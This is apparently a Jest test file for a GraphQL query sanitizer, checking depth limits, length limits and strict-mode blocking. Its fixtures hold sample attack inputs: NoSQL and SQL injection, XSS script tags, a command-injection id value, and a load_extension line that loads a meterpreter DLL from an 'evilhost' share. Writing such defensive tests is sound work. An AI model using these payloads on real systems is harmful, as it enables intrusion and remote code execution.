// import sanitizeQuery function
const sanitizeQuery = require('../sanitizeQuery.js');

describe('sanitizeQuery unit tests', () => {
  it('Should throw an error if a query is nested more than 10 levels deep and no argument is passed-in for the maxDepth parameter', () => {
    // init mock deepQuery string
    const deepQuery = `query maliciousQuery {
        thread(id: "some-id") {
          messages(first: 99999) {
            thread {
              messages(first: 99999) {
                thread {
                  messages(first: 99999)
                    thread {
                      messages(first: 99999)
                        thread {
                          messages(first: 99999)
                            thread {
                              messages(first: 99999)
                                thread {
                                  messages(first: 99999)
                                    thread {
                                      messages(first: 99999)
                                        thread {
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }`;
    // init mock shallowQuery string
    const shallowQuery = `query friendlyQuery {
        thread(id: "some-id") {
          messages(first: 10) {
            thread {
            }
          }
        }
      }`;
    // expect sanitizeQuery to throw error with deepQuery since depth > 10
    expect(() => sanitizeQuery(deepQuery)).toThrowError();
    // expect sanitizeQuery to not throw error with shallowQuery since depth < 10
    expect(() => sanitizeQuery(shallowQuery)).not.toThrowError();
  });
  it('Should allow user to customize depth limit', () => {
    // init mock deepQuery string
    const deepQuery = `query maliciousQuery {
      thread(id: "some-id") {
        messages(first: 99999) {
          thread {
            messages(first: 99999) {
              thread {
                messages(first: 99999)
                  thread {
                    messages(first: 99999)
                      thread {
                        messages(first: 99999)
                          thread {
                            messages(first: 99999)
                              thread {
                                messages(first: 99999)
                                  thread {
                                    messages(first: 99999)
                                      thread {
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }`;
    // init mock shallowQuery string
    const shallowQuery = `query friendlyQuery {
      thread(id: "some-id") {
        messages(first: 10) {
          thread {
          }
        }
      }
    }`;
    // user be able to customize desired maximum permitted query depth
    expect(() => sanitizeQuery(deepQuery, false, 20)).not.toThrowError();
    expect(() => sanitizeQuery(shallowQuery, false, 1)).toThrowError();
  });
  it('Should throw an error if a query is above the length limit', () => {
    // init mock longQuery (>2000 characters)
    const longQuery =
      'init sanitizeQuery, a function that accepts 4 params input (required, a graphQL query type string), strict (a bool value, default false, that enables additional query sanitization), maxDepth (the maximum query nesting depth permitted, type integer), and maxLength (maximum permitted query length, type integer) that users will require and invoke in their applications to sanitize the passed-in queryinit sanitizeQuery, a function that accepts 4 params input (required, a graphQL query type string), strict (a bool value, default false, that enables additional query sanitization), maxDepth (the maximum query nesting depth permitted, type integer), and maxLength (maximum permitted query length, type integer) that users will require and invoke in their applications to sanitize the passed-in queryinit sanitizeQuery, a function that accepts 4 params input (required, a graphQL query type string), strict (a bool value, default false, that enables additional query sanitization), maxDepth (the maximum query nesting depth permitted, type integer), and maxLength (maximum permitted query length, type integer) that users will require and invoke in their applications to sanitize the passed-in queryinit sanitizeQuery, a function that accepts 4 params input (required, a graphQL query type string), strict (a bool value, default false, that enables additional query sanitization), maxDepth (the maximum query nesting depth permitted, type integer), and maxLength (maximum permitted query length, type integer) that users will require and invoke in their applications to sanitize the passed-in queryinit sanitizeQuery, a function that accepts 4 params input (required, a graphQL query type string), strict (a bool value, default false, that enables additional query sanitization), maxDepth (the maximum query nesting depth permitted, type integer), and maxLength (maximum permitted query length, type integer) that users will require and invoke in their applications to sanitize the passed-in queryinit sanitizeQuery, a function that accepts 4 params input (required, a graphQL query type string), strict (a bool value, default false, that enables additional query sanitization), maxDepth (the maximum query nesting depth permitted, type integer), and maxLength (maximum permitted query length, type integer) that users will require and invoke in their applications to sanitize the passed-in query';
    // init mock shortQuery (< 2000 characters)
    const shortQuery =
      'init sanitizeQuery, a function that accepts 4 params input (required, a graphQL query type string), strict (a bool value, default false, that enables additional query sanitization), maxDepth (the maximum query nesting depth permitted, type integer), and maxLength (maximum permitted query length, type integer) that users will require and invoke in their applications to sanitize the passed-in query';
    // should throw error if query is longer than default (2000 characters) if no arg is passed in for maxLength
    expect(() => sanitizeQuery(longQuery)).toThrowError();
    expect(() => sanitizeQuery(shortQuery)).not.toThrowError();
  });
  it('Should allow user to customize length limit', () => {
    // init mock longQuery (>2000 characters)
    const longQuery =
      'init sanitizeQuery, a function that accepts 4 params input (required, a graphQL query type string), strict (a bool value, default false, that enables additional query sanitization), maxDepth (the maximum query nesting depth permitted, type integer), and maxLength (maximum permitted query length, type integer) that users will require and invoke in their applications to sanitize the passed-in queryinit sanitizeQuery, a function that accepts 4 params input (required, a graphQL query type string), strict (a bool value, default false, that enables additional query sanitization), maxDepth (the maximum query nesting depth permitted, type integer), and maxLength (maximum permitted query length, type integer) that users will require and invoke in their applications to sanitize the passed-in queryinit sanitizeQuery, a function that accepts 4 params input (required, a graphQL query type string), strict (a bool value, default false, that enables additional query sanitization), maxDepth (the maximum query nesting depth permitted, type integer), and maxLength (maximum permitted query length, type integer) that users will require and invoke in their applications to sanitize the passed-in queryinit sanitizeQuery, a function that accepts 4 params input (required, a graphQL query type string), strict (a bool value, default false, that enables additional query sanitization), maxDepth (the maximum query nesting depth permitted, type integer), and maxLength (maximum permitted query length, type integer) that users will require and invoke in their applications to sanitize the passed-in queryinit sanitizeQuery, a function that accepts 4 params input (required, a graphQL query type string), strict (a bool value, default false, that enables additional query sanitization), maxDepth (the maximum query nesting depth permitted, type integer), and maxLength (maximum permitted query length, type integer) that users will require and invoke in their applications to sanitize the passed-in queryinit sanitizeQuery, a function that accepts 4 params input (required, a graphQL query type string), strict (a bool value, default false, that enables additional query sanitization), maxDepth (the maximum query nesting depth permitted, type integer), and maxLength (maximum permitted query length, type integer) that users will require and invoke in their applications to sanitize the passed-in query';
    // init mock shortQuery (~400 characters)
    const shortQuery =
      'init sanitizeQuery, a function that accepts 4 params input (required, a graphQL query type string), strict (a bool value, default false, that enables additional query sanitization), maxDepth (the maximum query nesting depth permitted, type integer), and maxLength (maximum permitted query length, type integer) that users will require and invoke in their applications to sanitize the passed-in query';
    // should only throw error if query length is greater than passed-in user argument for maxLength
    expect(() => sanitizeQuery(longQuery, false, 10, 4000)).not.toThrowError();
    expect(() => sanitizeQuery(shortQuery, false, 10, 200)).toThrowError();
  });
  it('Should not throw errors when queries with potentially malicious fragments are invoked during non-strict mode', () => {
    // init arr of dangerousQueries (strings)
    const dangerousQueries = [
      `query {
      users(search: "{\"email\": {\"$gte\": \"\"}}",
            options: "{\"fields\": {}}") {
          _id
          username
          fullname
          email
      }
  }`,
      `SELECT * from customers where id='1233' OR 2=2—'`,
      `mutation {
    createPaste(title:"<h1>hello!</h1><script>alert('Attack')</script>", content:"zzzz", public:true) {
      paste {
        id
      }
    }
   }`,
      `query {
      customer(id: "22371' OR 1=1–") {
        name,
        email,
        address,
        contact
      }
    } `,
      `query {
      users(search: "{\"username\": {\"$regex\": \"jan\"}, \"email\": {\"$regex\": \"jan\"}}",
            options: "{\"skip\": 0, \"limit\": 10}") {
          _id
          username
          fullname
          email
      }
  }`,
      `query {
    users(search: "{\"email\": {\"$gte\": \"\"}}",
    options: "{\"fields\": {}}") {
  _id
  username
  fullname
  email
}
}`,
      `query {
      user(username: "*") {
        name
        email
        groups
      }
    }`,
      `query {
      getUser(id: "1; ls -la") {
        name
        email
      }
    }`,
      `query {
      getComment(id: "1") {
        user
        comment: "<script>alert('XSS Attack')</script>"
      }
    }`,
      `query {
      getComment(id: "1") {
        user
        comment: "<script>alert('XSS Attack')</script>"
      }
    }`,
      `UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
    `,
    ];
    // sanitizeQuery should not throw an error if a query with a potentially malicious fragment is passed in and strict mode is off
    dangerousQueries.forEach((maliciousQuery) => {
      expect(() => sanitizeQuery(maliciousQuery)).not.toThrowError();
    });
  });
  it('Should throw errors when queries with potentially malicious fragments are invoked during strict mode', () => {
    // init arr of dangerousQueries (strings)
    const dangerousQueries = [
      `query {
        users(search: "{\"email\": {\"$gte\": \"\"}}",
            options: "{\"fields\": {}}") {
          _id
          username
          fullname
          email
      }
    }`,
      `SELECT * from customers where id='1233' OR 2=2—'`,
      `mutation {
    createPaste(title:"<h1>hello!</h1><script>alert('Attack')</script>", content:"zzzz", public:true) {
      paste {
        id
      }
    }
    }`,
      `query {
      customer(id: "22371' OR 1=1–") {
        name,
        email,
        address,
        contact
      }
    } `,
      `query {
      users(search: "{\"username\": {\"$regex\": \"jan\"}, \"email\": {\"$regex\": \"jan\"}}",
            options: "{\"skip\": 0, \"limit\": 10}") {
          _id
          username
          fullname
          email
      }
    }`,
      `query {
    users(search: "{\"email\": {\"$gte\": \"\"}}",
    options: "{\"fields\": {}}") {
    _id
    username
    fullname
    email
    }
    }`,
      `query {
      user(username: "*") {
        name
        email
        groups
      }
    }`,
      `query {
      getUser(id: "1; ls -la") {
        name
        email
      }
    }`,
      `query {
      getComment(id: "1") {
        user
        comment: "<script>alert('XSS Attack')</script>"
      }
    }`,
      `query {
      getComment(id: "1") {
        user
        comment: "<script>alert('XSS Attack')</script>"
      }
    }`,
      `UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
    `,
    ];
    // sanitizeQuery should throw an error if a query with a potentially malicious fragment is passed in and strict mode is on
    //
    dangerousQueries.forEach((maliciousQuery) => {
      expect(() => sanitizeQuery(maliciousQuery, true)).toThrowError();
    });
  });
});
